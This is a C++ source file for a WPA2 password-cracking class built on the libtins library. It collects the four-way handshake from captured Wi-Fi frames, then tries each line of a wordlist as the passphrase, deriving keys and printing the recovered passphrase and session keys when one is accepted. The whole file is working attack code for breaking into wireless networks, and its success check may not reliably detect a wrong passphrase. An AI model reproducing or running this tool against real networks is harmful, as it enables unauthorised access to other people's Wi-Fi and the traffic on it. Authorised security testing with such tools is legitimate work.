#include "Wpa2_password_hack.hpp"

Wpa2_pw_hack::Wpa2_pw_hack() {
//        rsnhand = std::make_unique<Tins::RSNHandshakeCapturer>();

}


Wpa2_pw_hack::~Wpa2_pw_hack() {

}


void Wpa2_pw_hack::set_printer(std::shared_ptr <Print_devices> printer) {
    _printer = printer;
}

void Wpa2_pw_hack::setWordList(std::string filename) {
    wordlist = filename;
}


int Wpa2_pw_hack::start_pw_hack(Tins::Dot11Data *data_frame, std::string ssid, std::shared_ptr <Device> router,
                                std::shared_ptr <Device> host) {
    _printer->print_string("Start Hack");
    std::string string_test{""};
    Tins::RSNEAPOL eapol = data_frame->rfind_pdu<Tins::RSNEAPOL>();
    if ((eapol.key_ack() == 1) && (eapol.encrypted() == 0)) {

        string_test += " 1. ";
    } else if ((eapol.key_mic() == 1) && (eapol.secure() == 0)) {

        string_test += " 2. ";
    } else if (eapol.encrypted() == 1) {

        string_test += " 3. ";
    } else {

        string_test += " 4. ";

    }
    if (test_map.find(router->get_addresses().hw_addr) != test_map.end())
        test_map[router->get_addresses().hw_addr] += string_test;
    else
        test_map.insert(std::pair < Tins::HWAddress < 6 > ,
                        std::string > (router->get_addresses().hw_addr, string_test));
    //  _printer->print_string(router->get_addresses().hw_addr.to_string() + " " +test_map.at(router->get_addresses().hw_addr));
    if (rsnhand.process_packet(*data_frame)) {

        _printer->print_string("Got full handshake!");
        //found_handshake = true;
        //Wordlist attack
        // Wordlist load
        //  std::cout << "open wordlist\n";

        //  std::cout << "hack ..\n";

        //read line for line = 1 passphrase
        auto future = std::async(std::launch::async, [this, ssid]() {
                                     bool found = false;
                                     std::ifstream input(wordlist);
                                     std::string phrase;
                                     if (!input) {
                                         _printer->print_string("Cannot open wordlist! Exit..");
                                         return 3;
                                     }

                                     while (std::getline(input, phrase)) {
                                         std::cout << "Check Phrase :" << phrase << " SSID: " << ssid << std::endl;
                                         Tins::Crypto::WPA2::SupplicantData sup_data(phrase, ssid); // PMK
                                         try {
                                             //PTK
                                             _session_keys = Tins::Crypto::WPA2::SessionKeys(rsnhand.handshakes().front(), sup_data.pmk());
                                             _ptk = _session_keys.get_ptk();
                                             found = true;
                                             _psk = phrase;
                                             std::cout << "Phrase Detected: " << phrase << std::endl;
                                             return 1;
                                         }

                                         catch (...) {
                                             std::cout << "Bad Phrase: " << phrase << " by " << ssid << std::endl;
                                         }
                                     }

                                     if (!found) { return 3; } // change wordlist - nothing found
                                 }
        );
        return future.get();
    } else {
        return 2;
    }
    return 4;
}


std::string Wpa2_pw_hack::get_psk() {
    return _psk;
}

std::vector<unsigned char> Wpa2_pw_hack::get_ptk() {
    return _ptk;
}

Tins::Crypto::WPA2::SessionKeys Wpa2_pw_hack::get_session_keys() {
    return _session_keys;
}
